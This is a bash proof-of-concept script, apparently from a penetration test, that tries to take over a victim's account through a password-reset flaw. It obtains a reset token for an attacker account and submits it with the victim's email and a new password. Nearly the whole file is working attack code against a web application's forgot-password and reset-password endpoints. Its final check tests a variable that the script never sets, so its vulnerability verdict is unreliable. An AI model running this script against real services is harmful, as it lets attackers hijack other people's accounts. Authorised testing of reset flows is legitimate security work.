#!/usr/bin/env bash
# poc/4.6_insecure_reset_pass.sh
# Usage: ./poc/4.6_insecure_reset_pass.sh <attacker_email> <victim_email> [new_password]

set +e
set +o pipefail

source "$(dirname "$0")/config.sh"

ATTACKER_EMAIL="${1:-}"
VICTIM_EMAIL="${2:-}"
NEW_PASS="${3:-VictimNewPass_$(date +%s)!}"

if [ -z "$ATTACKER_EMAIL" ] || [ -z "$VICTIM_EMAIL" ]; then
    echo "Usage: $0 <attacker_email> <victim_email> [new_password]"
    exit 2
fi

FORGOT_URL="$BASE_URL/forgot-password"
RESET_URL="$BASE_URL/reset-password"

mkdir -p "$OUT_DIR"
OUT_FILE="$OUT_DIR/46_insecure_reset_$(date +%s).txt"
: > "$OUT_FILE"

log() { echo "$*" | tee -a "$OUT_FILE"; }

# returns body of response; prints [label] status + truncated body
do_req() {
    local label="$1"; shift
    local resp body code
    resp="$(curl -s -i "$@")"
    code="$(echo "$resp" | awk 'NR==1{print $2}')"
    body="$(echo "$resp" | awk 'BEGIN{h=1} h&&/^\r?$/{h=0;next} !h' | tr -d '\n' | cut -c1-200)"
    log "    [$label] HTTP $code | $body"
    echo "$resp"
}

log "=== 4.6: insecure password reset ==="
log "forgot : $FORGOT_URL"
log "reset  : $RESET_URL"
log "attacker: $ATTACKER_EMAIL | victim: $VICTIM_EMAIL"
log ""

# step 1: get a valid reset token for attacker account (legitimate request)
log "[1] request reset token for attacker"
RESP_BODY="$(curl -s -X POST "$FORGOT_URL" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$ATTACKER_EMAIL\"}")"

log "    response: $(echo "$RESP_BODY" | cut -c1-200)"

ATK_TOKEN="$(echo "$RESP_BODY" | jq -r '.reset_token // empty' 2>/dev/null)"

if [ -z "$ATK_TOKEN" ] || [ "$ATK_TOKEN" = "null" ]; then
    log "    could not extract reset_token — check endpoint or field name"
    exit 1
fi

log "    token: $ATK_TOKEN"
log ""

# use attacker token but swap email to victim (token/email mismatch)
log " reset victim using attacker token (token mismatch)"
do_req "token-mismatch" -X POST "$RESET_URL" \
    -H "Content-Type: application/json" \
    -d "{\"token\":\"$ATK_TOKEN\",\"email\":\"$VICTIM_EMAIL\",\"password\":\"$NEW_PASS\"}" > /dev/null
log ""

log "[DONE] output: $OUT_FILE"

if [ "$CODE_LOGIN_VICTIM" = "200" ]; then
    log "[VULNERABLE] attacker reset victim password"
else
    log "[OK] reset did not succeed"
fi